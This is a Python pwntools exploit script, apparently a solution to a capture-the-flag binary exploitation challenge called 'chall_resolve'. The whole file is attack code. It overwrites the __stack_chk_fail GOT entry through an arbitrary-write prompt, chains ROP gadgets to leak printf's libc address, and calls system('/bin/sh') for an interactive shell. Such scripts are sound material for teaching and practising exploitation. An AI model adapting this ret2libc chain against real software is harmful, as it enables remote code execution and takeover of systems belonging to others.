from pwn import *

filename = './chall_resolve'
chall = ELF(filename)

libcname = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libcname)

# conn = remote('localhost', 9001)
# conn = process(filename)
conn = gdb.debug(filename, '''
b *0x401230''')

main_addr = chall.functions['main'].address
stack_chk_fail_got = chall.got['__stack_chk_fail']
printf_got = chall.got['printf']
printf_plt = chall.plt['printf']
fgets_plt = chall.plt['fgets']
printf_libc = libc.functions['printf'].address
system_libc = libc.functions['system'].address
shell_str = next(libc.search(b'/bin/sh'))
aaw_addr = 0x00000000004011a1

# ROP gadgets
## 0x00000000004012a3: pop rdi; ret;
pop_rdi = 0x00000000004012a3
## 0x00000000004012a2: pop r15; ret;
pop_ret = 0x00000000004012a2
## 0x00000000004012a0: pop r14; pop r15; ret;
pop_pop_ret = 0x00000000004012a0
## 0x000000000040129e: pop r13; pop r14; pop r15; ret;
pop_pop_pop_ret = 0x000000000040129e


def AAW(dst, data):
    buf = str(hex(dst)).encode()
    conn.sendlineafter(b'Input address >> ', buf)

    buf = str(hex(data)).encode()
    conn.sendlineafter(b'Input value   >> ', buf)


# Input msg
buf1 = p64(pop_rdi)
buf1 += p64(printf_got)
buf1 += p64(printf_plt)
buf1 += p64(aaw_addr)

conn.sendlineafter(b'Input message >> ', buf1)

# Ignite ROP Chain
AAW(stack_chk_fail_got, pop_pop_pop_ret)

# Leak libc address
printf_leak = u64(conn.recv(6)+b'\x00\x00')
libc_base = printf_leak - printf_libc
info('printf_leak = 0x{:08x}'.format(printf_leak))

buf2 = b'b'*0x28
buf2 += p64(pop_rdi)
buf2 += p64(shell_str)
buf2 += p64(system_libc+libc_base)
# buf2 += b'b'*0x20
conn.sendlineafter(b'Input message >> ', buf2)

AAW(stack_chk_fail_got, pop_ret)

conn.interactive()
